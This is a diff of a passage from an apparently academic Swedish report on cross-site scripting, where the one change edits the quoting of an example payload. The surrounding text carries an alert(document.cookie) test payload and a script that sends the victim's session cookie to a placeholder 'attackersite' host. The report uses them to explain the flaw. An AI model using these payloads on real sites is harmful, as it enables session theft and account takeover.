@@ -31,7 +31,7 @@ webbläsaren utan att logga ut) [1, s. 8].
 XSS-brister uppstår när en applikation accepterar opålitlig data och skickar den till en webbläsare utan ordentlig
 validering eller escape-sekvenser. Via XSS kan angripare exekvera skript i offrets webbläsare, vilka kan stjäla 
 sessioner, förvanska webbplatser eller dirigera om användaren till skadliga webbplatser [1, s. 6].  
-I denna applikation går det att skriva "<a href="#" onclick="alert(document.cookie)">Hej</a> som ett meddelande, 
+I denna applikation går det att skriva <<a href='#' onclick='alert(document.cookie)'>Hej</a>> som ett meddelande, 
 och när man sedan klickar på länken syns sessionskakan i ett varningsfönster. Detta innebär att en angripare kan stjäla 
 en användares sessionskaka och på så sätt få tillgång till dennes konto, genom att skriva till exempel 
 "<script>document.location='http://attackersite/'+document.cookie</script>" som ett meddelande [2].  
